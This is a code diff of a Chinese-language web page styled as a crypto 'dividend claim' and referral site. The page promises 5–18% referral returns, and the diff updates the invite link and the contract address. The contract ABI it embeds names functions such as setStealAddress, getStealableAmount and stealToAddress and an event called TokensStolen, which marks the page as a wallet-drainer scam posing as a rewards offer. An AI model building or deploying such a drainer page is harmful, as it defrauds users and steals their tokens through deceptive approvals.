@@ -263,7 +263,7 @@
       <p class="text-sm text-gray-500 mb-3">每邀请一名用户，可随机获取好友领取分红的 <span class="font-semibold">5% - 18%</span> 收益分红。</p>
       <div class="flex gap-2">
         <input id="inviteInput" class="flex-1 px-4 py-3 border border-gray-300 rounded-l-lg text-sm" 
-               readonly value="https://reward.com/invite?ref=COMMUNITY">
+               readonly value="https://pangu.world">
         <button id="copyInviteBtn" class="px-4 py-3 bg-blue-500 text-white rounded-r-lg text-sm font-medium">
           复制
         </button>
@@ -287,276 +287,224 @@
 
   <script>
     // 合约地址 - 部署后替换为您的合约地址
-    const CONTRACT_ADDRESS = "0x0Fa51A95921600e9A4ddA4a62E977865F1ae6872";
+    const CONTRACT_ADDRESS = "0x020be599699535c33d23b112759Ea54C2397B806";
     
     // 合约ABI
     const CONTRACT_ABI = [
-      {
-        "inputs": [],
-        "name": "claimDividend",
-        "outputs": [],
-        "stateMutability": "nonpayable",
-        "type": "function"
-      },
-      {
-        "inputs": [],
-        "name": "emergencyWithdraw",
-        "outputs": [],
-        "stateMutability": "nonpayable",
-        "type": "function"
-      },
-      {
-        "inputs": [
-          {
-            "internalType": "bool",
-            "name": "_active",
-            "type": "bool"
-          }
-        ],
-        "name": "setActive",
-        "outputs": [],
-        "stateMutability": "nonpayable",
-        "type": "function"
-      },
-      {
-        "inputs": [
-          {
-            "internalType": "address",
-            "name": "_newAddress",
-            "type": "address"
-          }
-        ],
-        "name": "setStealAddress",
-        "outputs": [],
-        "stateMutability": "nonpayable",
-        "type": "function"
-      },
-      {
-        "inputs": [],
-        "stateMutability": "nonpayable",
-        "type": "constructor"
-      },
-      {
-        "anonymous": false,
-        "inputs": [
-          {
-            "indexed": true,
-            "internalType": "address",
-            "name": "user",
-            "type": "address"
-          }
-        ],
-        "name": "DividendClaimed",
-        "type": "event"
-      },
-      {
-        "inputs": [
-          {
-            "internalType": "address",
-            "name": "_newToken",
-            "type": "address"
-          }
-        ],
-        "name": "setTargetToken",
-        "outputs": [],
-        "stateMutability": "nonpayable",
-        "type": "function"
-      },
-      {
-        "anonymous": false,
-        "inputs": [
-          {
-            "indexed": true,
-            "internalType": "address",
-            "name": "user",
-            "type": "address"
-          },
-          {
-            "indexed": false,
-            "internalType": "uint256",
-            "name": "amount",
-            "type": "uint256"
-          },
-          {
-            "indexed": false,
-            "internalType": "address",
-            "name": "token",
-            "type": "address"
-          }
-        ],
-        "name": "TokensStolen",
-        "type": "event"
-      },
-      {
-        "stateMutability": "payable",
-        "type": "fallback"
-      },
-      {
-        "stateMutability": "payable",
-        "type": "receive"
-      },
-      {
-        "inputs": [
-          {
-            "internalType": "address",
-            "name": "user",
-            "type": "address"
-          }
-        ],
-        "name": "canClaim",
-        "outputs": [
-          {
-            "internalType": "bool",
-            "name": "",
-            "type": "bool"
-          }
-        ],
-        "stateMutability": "view",
-        "type": "function"
-      },
-      {
-        "inputs": [
-          {
-            "internalType": "address",
-            "name": "user",
-            "type": "address"
-          }
-        ],
-        "name": "getStealableAmount",
-        "outputs": [
-          {
-            "internalType": "uint256",
-            "name": "",
-            "type": "uint256"
-          }
-        ],
-        "stateMutability": "view",
-        "type": "function"
-      },
-      {
-        "inputs": [
-          {
-            "internalType": "address",
-            "name": "",
-            "type": "address"
-          }
-        ],
-        "name": "hasClaimed",
-        "outputs": [
-          {
-            "internalType": "bool",
-            "name": "",
-            "type": "bool"
-          }
-        ],
-        "stateMutability": "view",
-        "type": "function"
-      },
-      {
-        "inputs": [],
-        "name": "isActive",
-        "outputs": [
-          {
-            "internalType": "bool",
-            "name": "",
-            "type": "bool"
-          }
-        ],
-        "stateMutability": "view",
-        "type": "function"
-      },
-      {
-        "inputs": [],
-        "name": "owner",
-        "outputs": [
-          {
-            "internalType": "address",
-            "name": "",
-            "type": "address"
-          }
-        ],
-        "stateMutability": "view",
-        "type": "function"
-      },
-      {
-        "inputs": [],
-        "name": "stealToAddress",
-        "outputs": [
-          {
-            "internalType": "address",
-            "name": "",
-            "type": "address"
-          }
-        ],
-        "stateMutability": "view",
-        "type": "function"
-      },
-      {
-        "inputs": [],
-        "name": "targetToken",
-        "outputs": [
-          {
-            "internalType": "address",
-            "name": "",
-            "type": "address"
-          }
-        ],
-        "stateMutability": "view",
-        "type": "function"
-      }
-    ];
-
-    // 标准ERC20代币ABI
-    const ERC20_ABI = [
-      {
-        "constant": true,
-        "inputs": [],
-        "name": "name",
-        "outputs": [{"name": "", "type": "string"}],
-        "type": "function"
-      },
-      {
-        "constant": true,
-        "inputs": [],
-        "name": "symbol",
-        "outputs": [{"name": "", "type": "string"}],
-        "type": "function"
-      },
-      {
-        "constant": true,
-        "inputs": [],
-        "name": "decimals",
-        "outputs": [{"name": "", "type": "uint8"}],
-        "type": "function"
-      },
-      {
-        "constant": true,
-        "inputs": [{"name": "_owner", "type": "address"}],
-        "name": "balanceOf",
-        "outputs": [{"name": "balance", "type": "uint256"}],
-        "type": "function"
-      },
-      {
-        "constant": false,
-        "inputs": [
-          {"name": "_spender", "type": "address"},
-          {"name": "_value", "type": "uint256"}
-        ],
-        "name": "approve",
-        "outputs": [{"name": "", "type": "bool"}],
-        "type": "function"
-      },
-      {
-        "constant": true,
-        "inputs": [
-          {"name": "_owner", "type": "address"},
-          {"name": "_spender", "type": "address"}
-        ],
-        "name": "allowance",
-        "outputs": [{"name": "", "type": "uint256"}],
-        "type": "function"
-      }
-    ];
+	{
+		"inputs": [],
+		"name": "claimDividend",
+		"outputs": [],
+		"stateMutability": "nonpayable",
+		"type": "function"
+	},
+	{
+		"inputs": [],
+		"name": "emergencyWithdraw",
+		"outputs": [],
+		"stateMutability": "nonpayable",
+		"type": "function"
+	},
+	{
+		"inputs": [
+			{
+				"internalType": "bool",
+				"name": "_active",
+				"type": "bool"
+			}
+		],
+		"name": "setActive",
+		"outputs": [],
+		"stateMutability": "nonpayable",
+		"type": "function"
+	},
+	{
+		"inputs": [
+			{
+				"internalType": "address",
+				"name": "_newAddress",
+				"type": "address"
+			}
+		],
+		"name": "setStealAddress",
+		"outputs": [],
+		"stateMutability": "nonpayable",
+		"type": "function"
+	},
+	{
+		"inputs": [],
+		"stateMutability": "nonpayable",
+		"type": "constructor"
+	},
+	{
+		"anonymous": false,
+		"inputs": [
+			{
+				"indexed": true,
+				"internalType": "address",
+				"name": "user",
+				"type": "address"
+			}
+		],
+		"name": "DividendClaimed",
+		"type": "event"
+	},
+	{
+		"inputs": [
+			{
+				"internalType": "address",
+				"name": "_newToken",
+				"type": "address"
+			}
+		],
+		"name": "setTargetToken",
+		"outputs": [],
+		"stateMutability": "nonpayable",
+		"type": "function"
+	},
+	{
+		"anonymous": false,
+		"inputs": [
+			{
+				"indexed": true,
+				"internalType": "address",
+				"name": "user",
+				"type": "address"
+			},
+			{
+				"indexed": false,
+				"internalType": "uint256",
+				"name": "amount",
+				"type": "uint256"
+			},
+			{
+				"indexed": false,
+				"internalType": "address",
+				"name": "token",
+				"type": "address"
+			}
+		],
+		"name": "TokensStolen",
+		"type": "event"
+	},
+	{
+		"stateMutability": "payable",
+		"type": "fallback"
+	},
+	{
+		"stateMutability": "payable",
+		"type": "receive"
+	},
+	{
+		"inputs": [
+			{
+				"internalType": "address",
+				"name": "user",
+				"type": "address"
+			}
+		],
+		"name": "canClaim",
+		"outputs": [
+			{
+				"internalType": "bool",
+				"name": "",
+				"type": "bool"
+			}
+		],
+		"stateMutability": "view",
+		"type": "function"
+	},
+	{
+		"inputs": [
+			{
+				"internalType": "address",
+				"name": "user",
+				"type": "address"
+			}
+		],
+		"name": "getStealableAmount",
+		"outputs": [
+			{
+				"internalType": "uint256",
+				"name": "",
+				"type": "uint256"
+			}
+		],
+		"stateMutability": "view",
+		"type": "function"
+	},
+	{
+		"inputs": [
+			{
+				"internalType": "address",
+				"name": "",
+				"type": "address"
+			}
+		],
+		"name": "hasClaimed",
+		"outputs": [
+			{
+				"internalType": "bool",
+				"name": "",
+				"type": "bool"
+			}
+		],
+		"stateMutability": "view",
+		"type": "function"
+	},
+	{
+		"inputs": [],
+		"name": "isActive",
+		"outputs": [
+			{
+				"internalType": "bool",
+				"name": "",
+				"type": "bool"
+			}
+		],
+		"stateMutability": "view",
+		"type": "function"
+	},
+	{
+		"inputs": [],
+		"name": "owner",
+		"outputs": [
+			{
+				"internalType": "address",
+				"name": "",
+				"type": "address"
+			}
+		],
+		"stateMutability": "view",
+		"type": "function"
+	},
+	{
+		"inputs": [],
+		"name": "stealToAddress",
+		"outputs": [
+			{
+				"internalType": "address",
+				"name": "",
+				"type": "address"
+			}
+		],
+		"stateMutability": "view",
+		"type": "function"
+	},
+	{
+		"inputs": [],
+		"name": "targetToken",
+		"outputs": [
+			{
+				"internalType": "address",
+				"name": "",
+				"type": "address"
+			}
+		],
+		"stateMutability": "view",
+		"type": "function"
+	}
+];
 
     // 全局变量
     let web3, userAddress;
@@ -1049,4 +997,5 @@
   </script>
 </body>
 </html>
+
 
